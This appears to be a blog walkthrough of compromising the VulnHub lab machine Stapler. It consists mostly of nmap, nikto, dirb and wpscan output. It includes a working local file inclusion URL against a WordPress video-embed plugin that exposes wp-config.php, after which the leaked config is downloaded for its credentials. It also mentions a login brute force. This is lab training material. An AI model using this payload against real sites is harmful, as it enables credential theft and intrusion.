---
title: "Gaining access to Stapler (VulnHub)"
date: 2020-05-03
tags: [offensive security, vulnhub, gaining access]
header:
  image: "/images/banner2.png"
  excerpt: "Offensive security, VulnHub, Gaining access"
---

I started out by finding the IP address of the target's machine. This can be done with `netdiscover`, which shows the IP address along with a MAC address. Since I already knew the MAC address (shown in VirtualBox), this could be easily matched with the right IP address. I used the `-r` option to scan for a limited range in which I know the IP address will be, which saves time.

```bash
kali@kali:~$ sudo netdiscover -r 192.168.56.0/16

Currently scanning: 192.168.129.0/16   |   Screen View: Unique Hosts                                                                                                         

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                                              
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:00      1      60  Unknown vendor                                                                                                             
 192.168.56.100  08:00:27:bb:d2:10      1      60  PCS Systemtechnik GmbH                                                                                                     
 192.168.56.114  08:00:27:00:09:6d      1      60  PCS Systemtechnik GmbH                                                                                          
```

I then ran an nmap scan against the target's IP address `192.168.56.114` to find out more about the target. I used the `-sS`, `-A`, `-n` and `-oA` options because in my opinion these serve a good general purpose with relatively quick but useful results. I saved the output in a file because don’t like to do multiple scans unless I absolutely have to (such as when I need different `nmap` options to fit a very specific purpose).

```bash
kali@kali:~$ sudo nmap -sS -A -n -oA stapler 192.168.56.114
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-03 05:31 EDT
Nmap scan report for 192.168.56.114
Host is up (0.00069s latency).
Not shown: 992 filtered ports
PORT     STATE  SERVICE     VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.56.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
53/tcp   open   domain      dnsmasq 2.75
| dns-nsid:
|_  bind.version: dnsmasq-2.75
80/tcp   open   http        PHP cli server 5.5 or later
|_http-title: 404 Not Found
139/tcp  open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp  open   doom?
| fingerprint-strings:
|   NULL:
|     message2.jpgUT
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info:
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 7
|   Capabilities flags: 63487
|   Some Capabilities: LongColumnFlag, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, Support41Auth, FoundRows, Speaks41ProtocolNew, ConnectWithDatabase, SupportsCompression, Speaks41ProtocolOld, InteractiveClient, IgnoreSigpipes, SupportsLoadDataLocal, ODBCClient, SupportsTransactions, LongPassword, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: 9Zmj:\x1E3xH\x7F*\x12X\x05\x0B_Fb%\x12
|_  Auth Plugin Name: mysql_native_password
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-TCP:V=7.80%I=7%D=5/3%Time=5EAE8F82%P=x86_64-pc-linux-gnu%r(NULL
SF:,10F8,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x15
SF:2\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x04
SF:\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa2
SF:\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\x
SF:0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\xb
SF:2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu\
SF:xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd3
SF:\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa0
SF:\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x8
SF:7\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\xf
SF:4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\xd
SF:c\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd5
SF:\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xaf
SF:\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:\
SF:xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\x
SF:8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\x
SF:e7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd\
SF:xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\x
SF:9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\x
SF:f1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\x
SF:f8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak\
SF:xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\x
SF:d2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f\
SF:xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\[
SF:\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\xc
SF:c\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa7
SF:\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\x
SF:fd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x96
SF:\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f\
SF:xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4\
SF:xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\x
SF:88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xbc
SF:L}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0\
SF:.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\x
SF:f6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\xf
SF:3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\?
SF:\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
MAC Address: 08:00:27:00:09:6D (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -20m02s, deviation: 34m37s, median: -3s
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2020-05-03T10:31:57+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-05-03T09:31:57
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.69 ms 192.168.56.114

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.40 seconds
```

I checked if any of the versions running on the target's machine were vulnerable to any exploits, but couldn't find anything relevant. I then checked FTP since the `nmap` scan mentioned that anonymous access is allowed. Strangely enough this wasn't true - I was presented with a banner and a login prompt that wouldn't accept any (lack of) credentials that I could think of on the spot.

I then entered the target's IP address in a browser to see if anything interested was being hosted on the website on port 80. I couldn't find anything there, confirmed by `nikto` and `dirb`:

```bash
kali@kali:~$ nikto -h 192.168.56.114
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.114
+ Target Hostname:    192.168.56.114
+ Target Port:        80
+ Start Time:         2020-05-03 05:48:23 (GMT-4)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-3093: /.bashrc: User home dir was found with a shell rc file. This may reveal file and path information.
+ OSVDB-3093: /.profile: User home dir with a shell profile was found. May reveal directory information and system configuration.
+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
+ Scan terminated:  20 error(s) and 5 item(s) reported on remote host
+ End Time:           2020-05-03 05:48:31 (GMT-4) (8 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
kali@kali:~$ dirb http://192.168.56.114

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun May  3 06:04:29 2020
URL_BASE: http://192.168.56.114/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.114/ ----
+ http://192.168.56.114/.bashrc (CODE:200|SIZE:3771)                                                                                                                          
+ http://192.168.56.114/.profile (CODE:200|SIZE:675)                                                                                                                          

-----------------
END_TIME: Sun May  3 06:04:32 2020
DOWNLOADED: 4612 - FOUND: 2
```

I downloaded the `bashrc` and `.profile` files that were found, but only found standard stuff in them. The fact that there was absolutely nothing to be found on the website didn't sit right with me, so I did a more thorough `nmap` scan just incase and I found this:

```bash
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

Rerunning `nikto` on this newly discovered port returned a lot more:

```bash
kali@kali:~$ nikto -p 12380 -h 192.168.56.114
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.114
+ Target Hostname:    192.168.56.114
+ Target Port:        12380
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
+ Start Time:         2020-05-03 06:26:30 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'dave' found, with contents: Soemthing doesn't look right here
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Hostname '192.168.56.114' does not match certificate's names: Red.Initech
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 8071 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2020-05-03 06:28:57 (GMT-4) (147 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

The URLs reported in the previous scan didn't show any different pages than the default one, so I tried visiting them over HTTPS instead of HTTP. Sure enough, `/blogblog` served a Wordpress website. Running `wpscan` on it resulted in the following:

```bash
kali@kali:~$ wpscan --url https://192.168.56.114:12380/blogblog/ --plugins-version-detection aggressive --disable-tls-checks --force -e ap,at
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.6
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://192.168.56.114:12380/blogblog/
[+] Started: Sun May  3 06:58:43 2020

Interesting Finding(s):

[+] https://192.168.56.114:12380/blogblog/
 | Interesting Entries:
 |  - Server: Apache/2.4.18 (Ubuntu)
 |  - Dave: Soemthing doesn't look right here
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] https://192.168.56.114:12380/blogblog/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] https://192.168.56.114:12380/blogblog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Registration is enabled: https://192.168.56.114:12380/blogblog/wp-login.php?action=register
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: https://192.168.56.114:12380/blogblog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] https://192.168.56.114:12380/blogblog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).
 | Found By: Rss Generator (Passive Detection)
 |  - https://192.168.56.114:12380/blogblog/?feed=rss2, <generator>http://wordpress.org/?v=4.2.1</generator>
 |  - https://192.168.56.114:12380/blogblog/?feed=comments-rss2, <generator>http://wordpress.org/?v=4.2.1</generator>

[+] WordPress theme in use: bhost
 | Location: https://192.168.56.114:12380/blogblog/wp-content/themes/bhost/
 | Last Updated: 2019-12-08T00:00:00.000Z
 | Readme: https://192.168.56.114:12380/blogblog/wp-content/themes/bhost/readme.txt
 | [!] The version is out of date, the latest version is 1.4.4
 | Style URL: https://192.168.56.114:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1
 | Style Name: BHost
 | Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This theme ...
 | Author: Masum Billah
 | Author URI: http://getmasum.net/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2.9 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://192.168.56.114:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1, Match: 'Version: 1.2.9'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating All Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:24 <===========================================================================================> (20899 / 20899) 100.00% Time: 00:00:24
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] bhost
 | Location: https://192.168.56.114:12380/blogblog/wp-content/themes/bhost/
 | Last Updated: 2019-12-08T00:00:00.000Z
 | Readme: https://192.168.56.114:12380/blogblog/wp-content/themes/bhost/readme.txt
 | [!] The version is out of date, the latest version is 1.4.4
 | Style URL: https://192.168.56.114:12380/blogblog/wp-content/themes/bhost/style.css
 | Style Name: BHost
 | Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This theme ...
 | Author: Masum Billah
 | Author URI: http://getmasum.net/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - https://192.168.56.114:12380/blogblog/wp-content/themes/bhost/, status: 500
 |
 | Version: 1.2.9 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://192.168.56.114:12380/blogblog/wp-content/themes/bhost/style.css, Match: 'Version: 1.2.9'

[+] creative-blog
 | Location: https://192.168.56.114:12380/blogblog/wp-content/themes/creative-blog/
 | Last Updated: 2020-03-01T00:00:00.000Z
 | Readme: https://192.168.56.114:12380/blogblog/wp-content/themes/creative-blog/readme.txt
 | [!] The version is out of date, the latest version is 1.1.3
 | Style URL: https://192.168.56.114:12380/blogblog/wp-content/themes/creative-blog/style.css
 | Style Name: Creative Blog
 | Style URI: http://napitwptech.com/themes/creative-blog/
 | Description: Creative Blog is an extremely creative WordPress theme to create your own personal blog site very ea...
 | Author: Bishal Napit
 | Author URI: http://napitwptech.com/themes/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.56.114:12380/blogblog/wp-content/themes/creative-blog/, status: 500
 |
 | Version: 0.9 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://192.168.56.114:12380/blogblog/wp-content/themes/creative-blog/style.css, Match: 'Version: 0.9'

[+] sydney
 | Location: https://192.168.56.114:12380/blogblog/wp-content/themes/sydney/
 | Last Updated: 2020-03-13T00:00:00.000Z
 | Readme: https://192.168.56.114:12380/blogblog/wp-content/themes/sydney/readme.txt
 | [!] The version is out of date, the latest version is 1.60
 | Style URL: https://192.168.56.114:12380/blogblog/wp-content/themes/sydney/style.css
 | Style Name: Sydney
 | Style URI: http://athemes.com/theme/sydney
 | Description: Sydney is a powerful business theme that provides a fast way for companies or freelancers to create ...
 | Author: aThemes
 | Author URI: http://athemes.com
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.56.114:12380/blogblog/wp-content/themes/sydney/, status: 500
 |
 | Version: 1.28 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://192.168.56.114:12380/blogblog/wp-content/themes/sydney/style.css, Match: 'Version: 1.28'

[+] trope
 | Location: https://192.168.56.114:12380/blogblog/wp-content/themes/trope/
 | Last Updated: 2018-06-12T00:00:00.000Z
 | Readme: https://192.168.56.114:12380/blogblog/wp-content/themes/trope/readme.txt
 | [!] The version is out of date, the latest version is 1.2
 | Style URL: https://192.168.56.114:12380/blogblog/wp-content/themes/trope/style.css
 | Style Name: Trope
 | Style URI: http://wpdean.com/trope-wordpress-theme/
 | Description: Trope is a free WordPress theme that comes with clean, modern, minimal and fully responsive design w...
 | Author: WPDean
 | Author URI: http://wpdean.com/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.56.114:12380/blogblog/wp-content/themes/trope/, status: 500
 |
 | Version: 1.1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://192.168.56.114:12380/blogblog/wp-content/themes/trope/style.css, Match: 'Version: 1.1.0'

[+] twentyfifteen
 | Location: https://192.168.56.114:12380/blogblog/wp-content/themes/twentyfifteen/
 | Last Updated: 2020-03-31T00:00:00.000Z
 | Readme: https://192.168.56.114:12380/blogblog/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 2.6
 | Style URL: https://192.168.56.114:12380/blogblog/wp-content/themes/twentyfifteen/style.css
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.56.114:12380/blogblog/wp-content/themes/twentyfifteen/, status: 500
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://192.168.56.114:12380/blogblog/wp-content/themes/twentyfifteen/style.css, Match: 'Version: 1.1'

[+] twentyfourteen
 | Location: https://192.168.56.114:12380/blogblog/wp-content/themes/twentyfourteen/
 | Last Updated: 2020-03-31T00:00:00.000Z
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: https://192.168.56.114:12380/blogblog/wp-content/themes/twentyfourteen/style.css
 | Style Name: Twenty Fourteen
 | Style URI: https://wordpress.org/themes/twentyfourteen/
 | Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern design...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.56.114:12380/blogblog/wp-content/themes/twentyfourteen/, status: 500
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://192.168.56.114:12380/blogblog/wp-content/themes/twentyfourteen/style.css, Match: 'Version: 1.4'

[+] twentythirteen
 | Location: https://192.168.56.114:12380/blogblog/wp-content/themes/twentythirteen/
 | Last Updated: 2020-03-31T00:00:00.000Z
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: https://192.168.56.114:12380/blogblog/wp-content/themes/twentythirteen/style.css
 | Style Name: Twenty Thirteen
 | Style URI: https://wordpress.org/themes/twentythirteen/
 | Description: The 2013 theme for WordPress takes us back to the blog, featuring a full range of post formats, each...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.56.114:12380/blogblog/wp-content/themes/twentythirteen/, status: 500
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://192.168.56.114:12380/blogblog/wp-content/themes/twentythirteen/style.css, Match: 'Version: 1.5'

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Sun May  3 06:59:12 2020
[+] Requests Done: 20904
[+] Cached Requests: 81
[+] Data Sent: 5.5 MB
[+] Data Received: 2.846 MB
[+] Memory used: 274.082 MB
[+] Elapsed time: 00:00:28
```

I didn't find any vulnerabilities for the versions of these themes (and the bruteforce on the login form I had running in the background didn't look very promising), but I thought it was strange that no plug-ins were found. Especially when there were posts on the website that specifically mentioned new plug-ins being installed. I modified the options for `wpscan` a bit (and shortened the output to only contain the relevant information):

```bash
kali@kali:~$ wpscan --url https://192.168.56.114:12380/blogblog/ --disable-tls-checks --plugins-detection aggressive -e ap
[i] Plugin(s) Identified:

[+] advanced-video-embed-embed-videos-or-playlists
 | Location: https://192.168.56.114:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2015-10-14T13:52:00.000Z
 | Readme: https://192.168.56.114:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.56.114:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/, status: 200
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.56.114:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt

[+] akismet
 | Location: https://192.168.56.114:12380/blogblog/wp-content/plugins/akismet/
 | Latest Version: 4.1.5
 | Last Updated: 2020-04-29T13:02:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.56.114:12380/blogblog/wp-content/plugins/akismet/, status: 403
 |
 | The version could not be determined.

[+] shortcode-ui
 | Location: https://192.168.56.114:12380/blogblog/wp-content/plugins/shortcode-ui/
 | Last Updated: 2019-01-16T22:56:00.000Z
 | Readme: https://192.168.56.114:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
 | [!] The version is out of date, the latest version is 0.7.4
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.56.114:12380/blogblog/wp-content/plugins/shortcode-ui/, status: 200
 |
 | Version: 0.6.2 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.56.114:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt

[+] two-factor
 | Location: https://192.168.56.114:12380/blogblog/wp-content/plugins/two-factor/
 | Latest Version: 0.5.2
 | Last Updated: 2020-04-30T14:02:00.000Z
 | Readme: https://192.168.56.114:12380/blogblog/wp-content/plugins/two-factor/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.56.114:12380/blogblog/wp-content/plugins/two-factor/, status: 200
 |
 | The version could not be determined.

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Sun May  3 07:37:01 2020
[+] Requests Done: 86503
[+] Cached Requests: 28
[+] Data Sent: 52.231 MB
[+] Data Received: 11.69 MB
[+] Memory used: 349.422 MB
[+] Elapsed time: 00:01:41
```

It looked like `advanced-video-embed-embed-videos-or-playlists` was vulnerable to a LFI exploit. I did some research on how this exploit works exactly and did the following:

I edited the link in the exploit to fit the target's IP and port: `https://192.168.56.114:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php`

After visiting that link, I checked `/wp-content/uploads` for any new uploads and found the following:

![alt]({{ site.url }}{{ site.baseurl }}/images/stapler_newupload.png)

Inspecting this new file locally gave me the credentials I was after:

```bash
kali@kali:~$ wget https://192.168.56.114:12380/blogblog/wp-content/uploads/1930028253.jpeg --no-check-certificate
--2020-05-03 07:58:34--  https://192.168.56.114:12380/blogblog/wp-content/uploads/1930028253.jpeg
Connecting to 192.168.56.114:12380... connected.
WARNING: The certificate of ‘192.168.56.114’ is not trusted.
WARNING: The certificate of ‘192.168.56.114’ doesn't have a known issuer.
The certificate's owner does not match hostname ‘192.168.56.114’
HTTP request sent, awaiting response... 200 OK
Length: 3042 (3.0K) [image/jpeg]
Saving to: ‘1930028253.jpeg’

1930028253.jpeg                             100%[==========================================================================================>]   2.97K  --.-KB/s    in 0.001s  

2020-05-03 07:58:34 (3.74 MB/s) - ‘1930028253.jpeg’ saved [3042/3042]

kali@kali:~$ cat 1930028253.jpeg
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
